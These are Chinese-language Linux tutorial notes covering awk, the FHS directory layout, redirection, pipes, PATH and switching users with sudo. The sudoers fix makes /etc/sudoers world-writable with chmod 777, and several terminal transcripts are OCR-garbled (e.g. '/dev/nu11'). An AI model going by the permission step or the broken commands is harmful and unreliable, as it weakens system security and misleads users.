title="awk"></a>awk</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得<br>尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各<br>种分析处理。</p><p>awk有3个不同版本: awk、 nawk和gawk, 未作特别说明，一般指gawk, gawk 是AWK的GNU版本。<br>awk其名称得自于它的创始人Alfred Aho、Peter Weinberger和Brian Kernighan 姓氏的首个字母。实<br>际上AWK的确拥有自己的语言: AWK 程序设计语言，三位创建者已将它正式定义为“样式扫描和处<br>理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计<br>算以及生成报表，还有无数其他的功能。</p><p>有三种方式调用awk:</p><ul><li>1.命令行方式- (重点介绍)<br>awk [-F field-separator]<br>commands’<br>input-file(s)<br>其中，commands是真正awk命令，[-F域分隔符]是可选的。input-file(s) 是待处理的文件。<br>在awk中，文件的每一行中， 由域分隔符分开的每一项称为- 一个域。通常，在不指名F域分隔<br>符的情况下，默认的域分隔符是空格。</li><li>shell脚本方式<br>将所有的awk命令插入-一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，<br>-般通过键入脚本名称来调用。<br>相当于shell脚本首行的: #!&#x2F;bin&#x2F;bash<br>可以换成: #!&#x2F;bin&#x2F; awk</li><li>将所有的awk命令插入- -个单独文件,然后调用:<br>awk -f awk -script-file input-file(s)<br>其中，-f选项加载awk- script-file中的awk脚本，input-file(s) 跟上面的是一样</li></ul><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ last -5</span><br><span class="line">youzipii pts/1        192.168.174.1    Wed Mar 13 17:17   still logged in</span><br><span class="line">youzipii pts/0        :0               Wed Mar 13 17:16   still logged in</span><br><span class="line">youzipii :0           :0               Wed Mar 13 17:11   still logged in</span><br><span class="line">(unknown :0           :0               Wed Mar 13 16:54 - 17:11  (00:17)</span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Wed Mar 13 16:53 - 17:28  (00:34)</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">[youzipii@localhost ~]$ last -n 5 | awk &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">(unknown</span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br></pre></td></tr></table></figure><p>awk工作流程是这样的:读入有’ \n’换行符分割的一- 条记录，然后将记录按指定的域分隔符划分域，<br>填充域，$0则表示所有域, $1表示第- -个域, $n表示第n个域。默认域分隔符是”空白键”或”[tab]<br>键”,所以$1表示登录用户，$3表示登录用户ip,以此类推,可以用逗号隔开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&quot;\t&quot;$7&#125;&#x27;</span><br><span class="line">root    /bin/bash</span><br><span class="line">bin     /sbin/nologin</span><br><span class="line">daemon  /sbin/nologin</span><br><span class="line">adm     /sbin/nologin</span><br><span class="line">lp      /sbin/nologin</span><br><span class="line">sync    /bin/sync</span><br><span class="line">[youzipii@localhost ~]$ ifconfig | awk &#x27;/mask/&#x27;</span><br><span class="line">        inet 192.168.174.142  netmask 255.255.255.0  broadcast 192.168.174.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>-F 指定分隔符为：</p><p>&#x2F;内容&#x2F;打印内容所在行</p><h2 id="Linux重定向管道命令环境变量PATH"><a href="#Linux重定向管道命令环境变量PATH" class="headerlink" title="Linux重定向管道命令环境变量PATH"></a>Linux重定向管道命令环境变量PATH</h2><h3 id="Linux目录配置标准FHS"><a href="#Linux目录配置标准FHS" class="headerlink" title="Linux目录配置标准FHS"></a>Linux目录配置标准FHS</h3><p>是什么?</p><p>FHS本质一套规定Linux目录结构，软件建议安装位置的标准<br>为什么?</p><p>使用Linux来开发产品或者发布软件的公司、个人太多，如果每家公司或者个人都按照自己的意愿来配置文件或者软件的存放位置，这无疑是一场灾难。我们可不想学完我们的Linux之后，去公司发现看不懂别人的目录结构，更别谈开发了。<br>怎么办?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入根目录</span><br><span class="line">[root@1ocalhost home]# cd /</span><br><span class="line">#查看目录树(两层，只看目录，不看文件)</span><br><span class="line">[root@localhost /]# tree -d -L 1</span><br><span class="line">.</span><br><span class="line">|- bin -&gt; usr/bin #可执行文件目录，linux白带命令在这里</span><br><span class="line">|- boot #开机会使用到的文件，包括活Linux核心文件以及开机菜单与开机所需配置文件等等。</span><br><span class="line">|- dev #设备目录</span><br><span class="line">|- etc #配置文件几乎都放宣在这个自录内，例如人员的帐号密码档、各种服务的启始档等等</span><br><span class="line">|- home #家目录，系统默认的使用者主文件夹，用户的个人文件都可放在这里</span><br><span class="line">|-lib -&gt; usr/lib #放置在开机时会用到的函数库，以及在/bin或/sbin下面的指令会调用的l函数库l</span><br><span class="line">|-lib64 -&gt; usr /lib64#与lib类似</span><br><span class="line">|- media #放置可移除的设备，包括软盘、光盘、DVD等等设备都暂时挂载于此。</span><br><span class="line">|- mnt #设备临时挂载目录</span><br><span class="line">|─ opt #第三方协力软件放置的目录</span><br><span class="line">|- proc #是一个虚拟文件系统，放置内存中的数据，不占用硬盘空间</span><br><span class="line">|- root #系统管理员的主文件夹</span><br><span class="line">|- run#放置系统开机后所产生的各项信息</span><br><span class="line">|- sbin -&gt; usr/sbin #里面包括了开机、修复、还原系统所需要的指令，root用户使用</span><br><span class="line">|- srv #service是一些网络服务启动之后，这些服务所需要取用的数据目录。</span><br><span class="line">|—- sys #与proc类似</span><br><span class="line">|- tmp #temp,让一般使用者或者是正在执行的程序暂时放置文件的地方</span><br><span class="line">|- usr #unix software resource:与软件安装/执行有关</span><br><span class="line">|- var #variable,与系统运行过程有关,主要为变动性较大的数据</span><br><span class="line">10diro-torioc</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917"><a href="#linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917" class="headerlink" title="linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][https://blog.csdn.net/lzq00277/article/details/108303917]"></a>linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][<a href="https://blog.csdn.net/lzq00277/article/details/108303917]">https://blog.csdn.net/lzq00277/article/details/108303917]</a></h4><h3 id="Linux数据重定向的理解与操作"><a href="#Linux数据重定向的理解与操作" class="headerlink" title="Linux数据重定向的理解与操作"></a>Linux数据重定向的理解与操作</h3><h4 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h4><p>基本大部分计算机，要与人交互，都要默认打开三个设备(文件)</p><ul><li>标准输入，stdin，代码是0</li><li>标准输出，stdout，代码是1</li><li>标准错误输出，stderr，代码是2</li></ul><p>为什么?</p><p> Linux一切皆文件，交互需求，输入输出信息分类<br>除了上面的三个标准设备(文件)，我们可能经常有从文件读取数据,或者将数据写入文件的场景</p><h4 id="重定向的理解"><a href="#重定向的理解" class="headerlink" title="重定向的理解"></a>重定向的理解</h4><p>是什么?</p><ul><li>输出&#x2F;追加重定向:本来应该显示到显示器(通常)文件的内容，写入到文件当中。</li><li>输入重定向:或者本来应该从显示器(通常)文件读取数据，转化成从指定文件读取数据</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost test1]# touch file1 file2 file3</span><br><span class="line">[root@localhost test1]# ls   #当前只有三个文件</span><br><span class="line">file1  file2  file3</span><br><span class="line">[root@localhost test1]# whoami #该命令输出的结果,默认是直接打印到标准输出的stdout文件中</span><br><span class="line">root</span><br><span class="line">[root@localhost test1]# whoami&gt;file4 #输出重定向,不在显示出来</span><br><span class="line">[root@localhost test1]# ll #新创建文件file4</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file1</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 5 Oct 31 07:47 file4</span><br><span class="line">[root@localhost test1]# cat file4 #本来应该显示到显示器的内容, 写到了file4文件中</span><br><span class="line">root</span><br><span class="line">#追加重定向</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot;&gt;file4 #将新内容重定向到文件file4中</span><br><span class="line">[root@localhost test1]# cat file4 #发现之前的root被覆盖了</span><br><span class="line">hello bit</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #连续重定向多此,发现文件内容并无变化</span><br><span class="line">hello bit 其实并不是没有变化,而是每次写入都是重头开始</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit2&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #通过多此&gt;&gt;,我们发现内容是被追加到文件结尾的,叫做追加重定向</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">#输入重定向</span><br><span class="line">[root@localhost test1]# cat &gt; file1</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">besd^Ht^H^H^H^[[4~^[[4~ #ctrl+d结束,Delete键不能删除</span><br><span class="line">[root@localhost test1]# cat file1 #可以看出,如果cat后面没有紧跟数据源文件,默认从标准输入获取数据</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">best</span><br><span class="line">[root@localhost test1]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r--. 1 root root 28 Oct 31 07:50 file1</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 43 Oct 31 07:48 file4</span><br><span class="line">[root@localhost test1]# cat file4</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 #既然cat要打印文件,前提也是先读取file4,所以也可以这样写</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 &gt; file3 #读取再写入</span><br><span class="line">[root@localhost test1]# cat file3</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">[root@localhost test1]# cat file4 #原数据保留</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br></pre></td></tr></table></figure><p>cat &gt;输入时键盘的删除键也会被读入,虽然再次cat不显示,但内存不一样,可以用vi看出来</p><p>代码0,1,2?是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.cfind: &#x27; /home/w1&#x27;: Permission denied #报错信息</span><br><span class="line">/home/wudu/work/linux-57/1inux-1esson7/signal_test/test.c#正常信息/home/wudu/work/1inux-57/1inux-1esson7/sigaction_test/test.c#正常信息...</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c &gt; test_list #发现并不是所有信息都被重定向find: &#x27; /home/w1 &#x27;: Permission denied</span><br><span class="line">#报错信息并没有被写入目标文件</span><br><span class="line">[whb@vM-O-3-centos test]$ cat test_list</span><br><span class="line">/home/wudu/work/1inux-57/1inux-1esson7/signal_test/test.c#正常信息被写入了/home/wudu/work /1inux-57/1inux-lesson7/sigaction_test/test.c</span><br><span class="line">...</span><br><span class="line">#1:代表标准输出#2:代表标准错误</span><br><span class="line"># 但是他们两个默认都会往显示器打印，像上面的情况，打印输出到显示器会发生混乱</span><br><span class="line">#只打印正常信息</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c 2&gt;err.list/home/wudu/work/linux-57/1inux-lesson7/signal_test/test.c/home/wudu/work/linux-57/linux-lesson7/sigaction_test/test.c/home/wudu/work/1inux-57/linux-lesson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/linux-57/linux-1esson15/test/test.c/home/wudu/work / linux-57/1inux-1esson4/pipesize/test.c/home/wudu/work/linux-57/1inux-lesson5/testmkfifo/test.c/home/wudu/work / linux-57/linux-lesson5/shmtest/test.c/home/wudu/work / linux-57/1inux-lesson3/dynamic/test.c/home/wudu/work/linux-57/linux-lesson3 /static/test.c...</span><br><span class="line">[whb@vM-O-3-centos test]$ cat err.list #错误信息被单独分离出来find: ‘/home/w1’ : Permission denied</span><br><span class="line">find: &#x27; /home/sly&#x27;: Permission deniedfind: ‘ /home/zwc&#x27;: Permission deniedfind: ‘/home/cpx&#x27;: Permission denied</span><br><span class="line">然</span><br><span class="line">find: ‘ /home/gb&#x27;: Permission denied</span><br><span class="line">find: &#x27; /home/bss&#x27;: Permission denied</span><br><span class="line">#只打印错误信息</span><br><span class="line">#上面默认就是</span><br><span class="line">#正常和错误信息都重定向到文件中</span><br><span class="line">[whb@vM-O-3-centos test]$ find /home -name test,c &gt;info.list 2&gt;&amp;1[whb@vM-O-3-centos test]$ cat info.7ist</span><br><span class="line">find: &#x27; /home/wl’ : Permission denied</span><br><span class="line">find: &#x27; /home/wudu/ . local&#x27; : Permission denied</span><br><span class="line">/home/wudu/work/linux-57/linux-lesson7/sighal test/test.c/home/wudu/work/linux-57/linux-lesson7[sigaction_test/test.c/home/wudu/work/linux-57/1inux -Pesson7 sigmask/test.c</span><br><span class="line">...</span><br><span class="line">#2&gt;&amp;1??又是什么鬼?这个底层是怎么实现的。目前还不能讲，比特后期的课程才有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示器中的输出信息有错误的也有正确得,大于(&gt;)只把正确的写入,即只重定向标准输出,如果要都打印进去,在命令后面加上2&gt;&amp;1即可</p><h4 id="x2F-dev-x2F-null"><a href="#x2F-dev-x2F-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h4><p>垃圾桶黑洞设备，如果我知道有错误信息，但是我不想要，我想凡是错误信息直接丢弃，习惯写法是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.c 2&gt;/dev/nu11#便只显示正常信息了/home/wudu/work/linux-57/linux-lesson7/signal_test/test.c</span><br><span class="line">/home/wudu/work/1inux-57/linux-lesson7/sigaction_test/test.c/ home/wudu/work/linux-57/linux-1esson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/ linux-57/linux-1esson15/test/test.c/home/wudu/work/linux-57/1inux-lesson4/pipesize/test.c/home/wudu/work/linux-57/linux-1esson5/testmkfifo/test.c</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Linux管道命令的理解和操作"><a href="#Linux管道命令的理解和操作" class="headerlink" title="Linux管道命令的理解和操作"></a>Linux管道命令的理解和操作</h3><p>命令是可以产生数据的，如果我们还要多输出数据进行加工，甚至想多次加工，就需要使用管道</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# last #显示正在或者最近登陆linux的用户信息</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:06  (04:16)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">(unknown :0           :0               Mon Oct 30 20:00 - crash  (08:49)    </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Mon Oct 30 20:00 - 09:06  (13:05) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到5条信息呢 </span><br><span class="line">[root@localhost ~]# last | head -5 #其中&quot;|&quot;就是管道,head时一个获取文本行的工具,可以单独介绍</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:07  (04:17) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我(root)的登陆历史信息呢?</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot;</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 24 04:38 - 04:38  (00:00)    </span><br><span class="line">root     pts/0        :0               Tue Oct 24 04:30 - 04:39  (00:08)    </span><br><span class="line">root     :0           :0               Tue Oct 24 04:30 - 04:39  (00:08)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我的历史登陆时间?要用到awk</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot; | awk &#x27;&#123;print $1,$4,$5,$6,$7&#125;&#x27;</span><br><span class="line">root Tue Oct 31 06:45</span><br><span class="line">root Tue Oct 31 06:34</span><br><span class="line">root Tue Oct 31 04:51</span><br><span class="line">root Mon Oct 30 20:01</span><br><span class="line">root Tue Oct 24 04:38</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Mon Oct 23 19:08</span><br><span class="line">root Tue Jul 25 01:33</span><br><span class="line">root Tue Jul 25 01:32</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:09</span><br><span class="line">root Tue Nov 16 21:07</span><br></pre></td></tr></table></figure><p>可见，管道是可以级联多条命令的，每条命令的结果输出，都作为输入，导入下一条命令。有点像流水线</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101001146154.png" alt="image-20231101001146154"></p><p>理论上，管道的基本操作就完了，实际上，如果站在日常使用就够了，但是如果想面试大厂，至少有两方面问题需要深究?</p><ul><li>除了上面的文本处理工具，还有哪些文本处理工具你都使用过，各自有什么特征?·</li><li>站在操作系统层面，管道的底层原理是什么?</li></ul><h3 id="Linux环境变量与PATH"><a href="#Linux环境变量与PATH" class="headerlink" title="Linux环境变量与PATH"></a>Linux环境变量与PATH</h3><p>假设我们用c写一个输出hello world!的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat test.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# gcc -o mycmd test.c</span><br><span class="line">[root@localhost ~]# ./mycmd</span><br><span class="line">hello world</span><br><span class="line">#./也可以认为是一种命令</span><br><span class="line">#想ls,就在/bin/ls or/usr/bin/ls,为什么执行的时候可以不带路径呢</span><br></pre></td></tr></table></figure><p>环境变量PATH<br>是一个路径集，命令再被执行时，系统会在环境变量PATH中进行路径查找，如果找到，就停止查找，执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo $PATH #不同环境,平台的内容可能不同</span><br><span class="line">/usr/local/soft/java/jdk1.8.0_40/bin:/usr/local/soft/java/jdk1.8.0_40/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">$:用来显示PATH环境变量的内容</span><br><span class="line">#各个路径以:作为分隔符,每个区域代表一个搜索路径</span><br></pre></td></tr></table></figure><p>这也就解释了，为何ls不需要带路径，因为ls所在的路径，本身就在PATH环境变量列表当中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# which ls</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">/usr/bin/ls</span><br></pre></td></tr></table></figure><p>那么问题来了，我也想让我的’hello world’程序执行的时候不带.&#x2F;这样的路径,怎么办呢?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#方法一</span><br><span class="line">[whb@vM-O-3-centos test]$ mycmd-bash: mycmd: command not found</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo cp mycmd /usr/bin[sudo] password for whb:</span><br><span class="line">[whb@vM-O-3-centos test]$ 1s /usr/bin/mycmd/usr/bin/mycmd</span><br><span class="line">[whb@VM-O-3-centos test]$ mycmd#但是千万不要这样干，因为会‘污染&#x27;指令集he1lo wor1d</span><br><span class="line">#方法二</span><br><span class="line">[whb@vM-O-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/loca1/jdk8/jre/bin:/usr/loca1/bin:/usr/bin: [usr/Toca1/sbin:/usr/sbin : /home/whb / .1oca1/bin : /home/whb/bin</span><br><span class="line">[whb@vM-O-3-centos test]$ pwd#查看自己当前处于哪个目录/home/whb/test</span><br><span class="line">[whb@VM-0-3-centos test]s export PATH=$PATH:/home/whb/test#导出新的环境变量，加上程序所在的路径[whb@vM-0-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/local/jdk8/jre/bin;/eseloca1/bin:/usr/bin:/usr/local/sbin:/usr/sbin : /home/whb / .loca1/bin:/home/whb/bin : / home/vwhb/tes t</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo rm /usr/bin/mycmd#删掉在/usr/bin路径下的可执行程序[whb@vM-O-3-centos test]$ which myemd #mycmdt经能通过环境变量被找到</span><br><span class="line">~/test/mycmd</span><br><span class="line">[whb@vM-0-3-centos test]$ mycmd就可以不带路径he1lo wor1d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在思考一下，几乎可以得出如下结论;</p><ul><li>系统本身会提供某种全局育找属性，帮我们找到特定的模块&#x2F;程序</li></ul><p>其实，编译器内部也有类似的功能，想想，为何我们#includec头文件&gt;,并没有指明头文件在哪里，但是编译器也能帮我们找到并展开，包括我们也并没有指明我们的程序依赖哪些第三方库，编译器也能找到。</p><h3 id="插话-vim编辑器里Tab键缩进不是4个空格怎么调"><a href="#插话-vim编辑器里Tab键缩进不是4个空格怎么调" class="headerlink" title="插话,vim编辑器里Tab键缩进不是4个空格怎么调"></a>插话,vim编辑器里Tab键缩进不是4个空格怎么调</h3><ul><li><p>第一步,找到vimrc文件所在位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># find / -name vimrc</span><br></pre></td></tr></table></figure></li><li><p>第二步: 找到以后用vim打开vimrc文件并增加下面两行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set ts=4</span><br><span class="line">set expandtab</span><br></pre></td></tr></table></figure><p>加在set ruler或即可</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101002709400.png" alt="image-20231101002709400"></p></li></ul><h2 id="Linux权限理解"><a href="#Linux权限理解" class="headerlink" title="Linux权限理解"></a>Linux权限理解</h2><h3 id="Linux用户的概念"><a href="#Linux用户的概念" class="headerlink" title="Linux用户的概念"></a>Linux用户的概念</h3><h4 id="Linux下有两种用户：超级用户（root）、普通用户"><a href="#Linux下有两种用户：超级用户（root）、普通用户" class="headerlink" title="Linux下有两种用户：超级用户（root）、普通用户"></a>Linux下有两种用户：超级用户（root）、普通用户</h4><ul><li>超级用户:可以再linux系统下做任何事情，不受限制</li><li>普通用户:在linux下做有限的事情。</li><li>超级用户的命令提示符是”#”，普通用户的命令提示符是”$”。</li></ul><h3 id="角色切换"><a href="#角色切换" class="headerlink" title="角色切换"></a>角色切换</h3><h4 id="普通用户切换超级用户"><a href="#普通用户切换超级用户" class="headerlink" title="普通用户切换超级用户"></a>普通用户切换超级用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[sudo] password for youzipii: </span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# </span><br></pre></td></tr></table></figure><h4 id="超级用户切换到普通用户"><a href="#超级用户切换到普通用户" class="headerlink" title="超级用户切换到普通用户"></a>超级用户切换到普通用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# exit</span><br><span class="line">exit</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br></pre></td></tr></table></figure><h4 id="怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html"><a href="#怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html" class="headerlink" title="怎么查看当前linux有多少用户[好文][https://www.cnblogs.com/will-wu/p/12937015.html]"></a>怎么查看当前linux有多少用户[好文][<a href="https://www.cnblogs.com/will-wu/p/12937015.html]">https://www.cnblogs.com/will-wu/p/12937015.html]</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | cut -f 1 -d :</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | cut -f 1 -d:</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">...</span><br><span class="line"># 注：| 是管道，把cat的输出传给cut处理；后面的cut取出每一行的以：分割的第一栏</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">...</span><br><span class="line">/etc/passwd 文件存放的是用户信息.由六个分号组成的7个信息,分别是:</span><br><span class="line">用户名 （magesh）： 已创建用户的用户名，字符长度 1 个到 12 个字符。</span><br><span class="line">密码（x）：代表加密密码保存在 `/etc/shadow 文件中。</span><br><span class="line">用户 ID（506）：代表用户的 ID 号，每个用户都要有一个唯一的 ID 。UID 号为 0 的是为 root 用户保留的，UID 号 1 到 99 是为系统用户保留的，UID 号 100-999 是为系统账户和群组保留的。</span><br><span class="line">群组 ID （507）：代表群组的 ID 号，每个群组都要有一个唯一的 GID ，保存在 /etc/group文件中。</span><br><span class="line">用户信息（2g Admin - Magesh M）：代表描述字段，可以用来描述用户的信息（LCTT 译注：此处原文疑有误）。</span><br><span class="line">家目录（/home/mageshm）：代表用户的家目录。</span><br><span class="line">Shell（/bin/bash）：代表用户使用的 shell 类型。</span><br></pre></td></tr></table></figure><h4 id="报错-用户不在sudoers文件中"><a href="#报错-用户不在sudoers文件中" class="headerlink" title="报错(用户不在sudoers文件中)"></a>报错(用户不在sudoers文件中)</h4><p>在使用sudo -s命令时,出现以下情况</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">youzipii is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>解决方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一步先su - 进入root模式</span><br><span class="line"># 第二步再去修改/etc/sudoers里的内容,在root下面加入用户名,其他与root一致</span><br><span class="line"># 但文件权限可能不够,需要先给权限</span><br><span class="line">[root@localhost ~]# chmod 777 /etc/sudoers</span><br><span class="line">[root@localhost ~]# vi /etc/sudoers</span><br><span class="line">...</span><br><span class="line">## Allow root to run any commands anywhere </span><br><span class="line">root    ALL=(ALL)   ALL</span><br><span class="line">youzipii ALL=(ALL)     ALL</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# chmod u-wx,o-wx,g-rwx /etc/sudoers</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，用户角色切换还有其他方式，还有很多细节.<br>还有，Linux是多用户的，所以可以同时登陆多人，甚至你可以切成别人的身份，但是目前我们的Linux机器，大都是自己使用，所以先不考虑这些。</p><h3 id="Linux权限管理"><a 